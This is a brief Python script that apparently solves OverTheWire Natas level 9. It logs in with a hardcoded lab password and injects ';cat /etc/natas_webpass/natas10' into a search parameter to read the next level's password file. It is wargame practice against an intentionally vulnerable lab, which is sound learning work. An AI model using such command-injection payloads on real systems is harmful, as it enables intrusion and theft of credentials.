import requests
import re

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
url = "http://natas9.natas.labs.overthewire.org/"

data = { "needle" : ";cat /etc/natas_webpass/natas10", "submit" : "submit" }

session = requests.Session()
response = session.post(url, auth=(username,password),data=data)
content = response.text

print(re.findall("<pre>\n(.*)\n",content)[0])